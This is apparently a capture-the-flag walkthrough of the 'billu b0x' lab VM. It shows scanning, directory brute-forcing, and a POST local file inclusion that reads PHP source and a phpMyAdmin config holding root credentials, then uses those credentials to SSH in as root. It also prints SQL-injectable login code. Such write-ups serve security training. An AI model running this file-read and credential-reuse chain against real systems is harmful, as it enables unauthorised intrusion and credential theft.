NetDiscover

```bash
root@kali:~# netdiscover -i eth0 -r 192.168.100.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts                 
                                                                               
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.100.100 08:00:27:05:78:33      1      60  Cadmus Computer Systems     
 192.168.100.101 08:00:27:1c:31:b1      1      60  Cadmus Computer Systems     

root@kali:~# 
```

Target: 192.168.100.101

Nmap

```bash
root@kali:~# nmap -p- -A 192.168.100.101

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-05-02 09:43 CEST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.100.101
Host is up (0.00091s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 fa:cf:a2:52:c4:fa:f5:75:a7:e2:bd:60:83:3e:7b:de (DSA)
|   2048 88:31:0c:78:98:80:ef:33:fa:26:22:ed:d0:9b:ba:f8 (RSA)
|_  256 0e:5e:33:03:50:c9:1e:b3:e7:51:39:a4:4a:10:64:ca (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: --==[[IndiShell Lab]]==--
MAC Address: 08:00:27:1C:31:B1 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.91 ms 192.168.100.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.73 seconds
root@kali:~# 
```

Directory bruteforce

```bash
root@kali:~# wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --hc 404,301 http://192.168.100.101/FUZZ/
********************************************************
* Wfuzz 2.1.3 - The Web Bruteforcer                      *
********************************************************

Target: http://192.168.100.101/FUZZ/
Total requests: 207629

==================================================================
ID	Response   Lines      Word         Chars          Request    
==================================================================

00027:  C=403     10 L	      30 W	    291 Ch	  "cgi-bin"
00032:  C=200     16 L	      75 W	   1349 Ch	  "images"
00153:  C=403     10 L	      30 W	    287 Ch	  "doc"
01575:  C=403     10 L	      30 W	    289 Ch	  "icons"
04345:  C=200     16 L	      74 W	   1331 Ch	  "uploaded_images"
41788:  C=200    166 L	     357 W	   3267 Ch	  ""
89117:  C=403     10 L	      30 W	    297 Ch	  "server-status"
207628:  C=404      9 L	      32 W	    285 Ch	  "t1948"^C
Finishing pending requests...
root@kali:~#
root@kali:/# wfuzz -c -z file,/usr/share/seclists/Discovery/Web_Content/big.txt --hc 404,301 http://192.168.100.101/FUZZ/
********************************************************
* Wfuzz 2.1.3 - The Web Bruteforcer                      *
********************************************************

Target: http://192.168.100.101/FUZZ/
Total requests: 20469

==================================================================
ID	Response   Lines      Word         Chars          Request    
==================================================================

00021:  C=403     10 L	      30 W	    293 Ch	  ".htaccess"
00022:  C=403     10 L	      30 W	    293 Ch	  ".htpasswd"
04296:  C=403     10 L	      30 W	    291 Ch	  "cgi-bin"
04297:  C=403     10 L	      30 W	    292 Ch	  "cgi-bin/"
06203:  C=403     10 L	      30 W	    287 Ch	  "doc"
09205:  C=403     10 L	      30 W	    289 Ch	  "icons"
09328:  C=200     16 L	      75 W	   1349 Ch	  "images"
14062:  C=200    125 L	     498 W	   8367 Ch	  "phpmy"
16168:  C=403     10 L	      30 W	    297 Ch	  "server-status"
18710:  C=200     16 L	      74 W	   1331 Ch	  "uploaded_images"

Total time: 31.61602
Processed Requests: 20469
Filtered Requests: 20459
Requests/sec.: 647.4249

root@kali:/# 
root@kali:~# dirb http://192.168.100.101

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue May  2 09:54:18 2017
URL_BASE: http://192.168.100.101/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.100.101/ ----
+ http://192.168.100.101/add (CODE:200|SIZE:307)                                                         
+ http://192.168.100.101/c (CODE:200|SIZE:1)                                                             
+ http://192.168.100.101/cgi-bin/ (CODE:403|SIZE:291)                                                    
+ http://192.168.100.101/head (CODE:200|SIZE:2793)                                                       
==> DIRECTORY: http://192.168.100.101/images/                                                            
+ http://192.168.100.101/in (CODE:200|SIZE:47559)                                                        
+ http://192.168.100.101/index (CODE:200|SIZE:3267)                                                      
+ http://192.168.100.101/index.php (CODE:200|SIZE:3267)                                                  
+ http://192.168.100.101/panel (CODE:302|SIZE:2469)                                                      
+ http://192.168.100.101/server-status (CODE:403|SIZE:296)                                               
+ http://192.168.100.101/show (CODE:200|SIZE:1)                                                          
+ http://192.168.100.101/test (CODE:200|SIZE:72)                                                         
                                                                                                         
---- Entering directory: http://192.168.100.101/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue May  2 09:54:22 2017
DOWNLOADED: 4612 - FOUND: 11
root@kali:~# 
```

Url analysis

```bash
root@kali:~# curl http://192.168.100.101/add
<form  method="post" enctype="multipart/form-data">
    Select image to upload:
    <input type="file" name=image>
	<input type=text name=name value="name">
	<input type=text name=address value="address">
	<input type=text name=id value=1337 >
    <input type="submit" value="upload" name="upload">
</form>
root@kali:~# curl http://192.168.100.101/test
'file' parameter is empty. Please provide file path in 'file' parameter
root@kali:~# 
```

http://192.168.100.101/in: phpinfo page
http://192.168.100.101/test probably contains an LFI

Check if file is GET param

```bash
root@kali:~# curl http://192.168.100.101/test?file=test.php
'file' parameter is empty. Please provide file path in 'file' parameter
root@kali:~#
```

Then it's a POST, trying to include index.php

```bash
root@kali:~# curl --data "file=index.php" http://192.168.100.101/test
<?php
session_start();

include('c.php');
include('head.php');
if(@$_SESSION['logged']!=true)
{
	$_SESSION['logged']='';
	
}

if($_SESSION['logged']==true &&  $_SESSION['admin']!='')
{
	
	echo "you are logged in :)";
	header('Location: panel.php', true, 302);
}
else
{
echo '<div align=center style="margin:30px 0px 0px 0px;">
<font size=8 face="comic sans ms">--==[[ billu b0x ]]==--</font> 
<br><br>
Show me your SQLI skills <br>
<form method=post>
Username :- <Input type=text name=un> &nbsp Password:- <input type=password name=ps> <br><br>
<input type=submit name=login value="let\'s login">';
}
if(isset($_POST['login']))
{
	$uname=str_replace('\'','',urldecode($_POST['un']));
	$pass=str_replace('\'','',urldecode($_POST['ps']));
	$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
	$result = mysqli_query($conn, $run);
if (mysqli_num_rows($result) > 0) {

$row = mysqli_fetch_assoc($result);
	   echo "You are allowed<br>";
	   $_SESSION['logged']=true;
	   $_SESSION['admin']=$row['username'];
	   
	 header('Location: panel.php', true, 302);
   
}
else
{
	echo "<script>alert('Try again');</script>";
}
	
}
echo "<font size=5 face=\"comic sans ms\" style=\"left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\">B0X Powered By <font color=#ff9933>Pirates</font> ";

?>


root@kali:~# 
```

analysis of other php files

```bash
root@kali:~# curl --data "file=head.php" http://192.168.100.101/test
<?php
echo '
<html>
<head>
<link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLfLXmLeMSTt0jOXREfgvdp8IYWnE9_t49PpAiJNvwHTqnKkL4" rel="icon" type="image/x-icon"/>
</script>
<title>--==[[IndiShell Lab]]==--</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<STYLE>
body {
	background: url(images/white_beard.png);
	background-size: 100% 670px;
        background-repeat: no-repeat;
        background-attachment: fixed;
        font-family: Tahoma;
       color: white;

}
.side-pan {
   margin: 0;
   border:0px;
   
   width:200px;
   padding: 5px 23px;
   margin:0px;
   -webkit-border-radius: 0px;
   -moz-border-radius: 0px;
   border-radius: 0px;
   border-bottom: 1px solid black;
   color: white;
   font-size: 20px;
   font-family: Georgia, serif;
   text-decoration: none;
   vertical-align: left;
   align:left;
   }
   div#left {
    width: 100%;
    height: 50px;
    float: left;
	}
div#right {
    margin-left: 20%;
    height: 50px;
	color: white;
    font-size: 20px;
    font-family: Georgia, serif;
	}
.main div {
  float: left;
  clear: none; 
	}

input {
border			: solid 2px ;
border-color		: black;
BACKGROUND-COLOR: #444444;
font: 8pt Verdana;
color: white;
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: #FFF;
}
#t input[type=\'submit\']{
	COLOR: White;
	border:none;
	BACKGROUND-COLOR: black;
}
#t input[type=\'submit\']:hover {
	
	BACKGROUND-COLOR: #ff9933;
	color: black;
	
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 0px ;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 2px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: #191919;;
color: #FFF;
}
textarea {
border			: dashed 2px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
A:link {
border: 1px;
	COLOR: red; TEXT-DECORATION: none
}
A:visited {
	COLOR: red; TEXT-DECORATION: none
}
A:hover {
	color: White; TEXT-DECORATION: none
}
A:active {
	color: white; TEXT-DECORATION: none
}

.download {
   margin: 0;
   border:0px;
   background:#C0C0C0;
   width:110px;
   height:30px;
   
   margin:0px;
   -webkit-border-radius: 0px;
   -moz-border-radius: 0px;
   border-radius: 6px;
   border-bottom: 1px solid black;
   color: #28597a;
   font-size: 20px;
   font-family: Georgia, serif;
   text-decoration: none;
   vertical-align: left;
   align:left;
   }

</STYLE>
<script type="text/javascript">
<!--
    function lhook(id) {
       var e = document.getElementById(id);
       if(e.style.display == \'block\')
          e.style.display = \'none\';
       else
          e.style.display = \'block\';
    }
//-->
</script>
';

?>
root@kali:~# 
root@kali:~# curl --data "file=c.php" http://192.168.100.101/test
<?php
#header( 'Z-Powered-By:its chutiyapa xD' );
header('X-Frame-Options: SAMEORIGIN');
header( 'Server:testing only' );
header( 'X-Powered-By:testing only' );

ini_set( 'session.cookie_httponly', 1 );

$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");

// Check connection
if (mysqli_connect_errno())
  {
  echo "connection failed ->  " . mysqli_connect_error();
  }

?>

root@kali:~# 
```

The phpmy is a phpmyadmin instance

```bash
root@kali:/# curl http://192.168.100.101/phpmy/ | grep phpmyadmin
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0    <link rel="stylesheet" type="text/css" href="phpmyadmin.css.php?server=1&amp;lang=en&amp;collation_connection=utf8_general_ci&amp;token=9ecfa6e58fe914595530ba42d7cb388d&amp;js_frame=right&amp;nocache=4088209089" />
<a href="./url.php?url=http%3A%2F%2Fwww.phpmyadmin.net%2F&amp;lang=en&amp;collation_connection=utf8_general_ci&amp;token=9ecfa6e58fe914595530ba42d7cb388d&phpMyAdmin=am2s5limljseddnfgr3pchiv9qfkn9jl" target="_blank" class="logo"><img src="./themes/pmahomme/img/logo_right.png" id="imLogo" name="imLogo" alt="phpMyAdmin" border="0" /></a>
100  8367    0  8367    0     0   173k      0 --:--:-- --:--:-- --:--:--  177k
root@kali:/# 
```

Reading the default config file

```bash
root@kali:/# curl --data "file=/var/www/phpmy/config.inc.php" http://192.168.100.101/test
<?php

/* Servers configuration */
$i = 0;

/* Server: localhost [1] */
$i++;
$cfg['Servers'][$i]['verbose'] = 'localhost';
$cfg['Servers'][$i]['host'] = 'localhost';
$cfg['Servers'][$i]['port'] = '';
$cfg['Servers'][$i]['socket'] = '';
$cfg['Servers'][$i]['connect_type'] = 'tcp';
$cfg['Servers'][$i]['extension'] = 'mysqli';
$cfg['Servers'][$i]['auth_type'] = 'cookie';
$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = 'roottoor';
$cfg['Servers'][$i]['AllowNoPassword'] = true;

/* End of servers configuration */

$cfg['DefaultLang'] = 'en-utf-8';
$cfg['ServerDefault'] = 1;
$cfg['UploadDir'] = '';
$cfg['SaveDir'] = '';


/* rajk - for blobstreaming */
$cfg['Servers'][$i]['bs_garbage_threshold'] = 50;
$cfg['Servers'][$i]['bs_repository_threshold'] = '32M';
$cfg['Servers'][$i]['bs_temp_blob_timeout'] = 600;
$cfg['Servers'][$i]['bs_temp_log_threshold'] = '32M';


?>
root@kali:/# 
```

trying to login via ssh with the credentials found in phpmyadmin config.inc.php

```bash
root@kali:/# ssh root@192.168.100.101
The authenticity of host '192.168.100.101 (192.168.100.101)' can't be established.
ECDSA key fingerprint is SHA256:UyLCTuDmpoRJdivxmtTOMWDk0apVt5NWjp8Xno1e+Z4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.100.101' (ECDSA) to the list of known hosts.
root@192.168.100.101's password: 
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue May  2 15:41:13 IST 2017

  System load:  0.0               Processes:           77
  Usage of /:   12.6% of 9.61GB   Users logged in:     0
  Memory usage: 11%               IP address for eth0: 192.168.100.101
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Your Hardware Enablement Stack (HWE) is supported until April 2017.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@indishell:~# id
uid=0(root) gid=0(root) groups=0(root)
root@indishell:~# ls
root@indishell:~# ls -la
total 24
drwx------  4 root root 4096 May  2 15:41 .
drwxr-xr-x 22 root root 4096 Mar 18 23:07 ..
drwx------  2 root root 4096 Mar 18 23:13 .aptitude
-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
drwx------  2 root root 4096 May  2 15:41 .cache
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
root@indishell:~# 
```
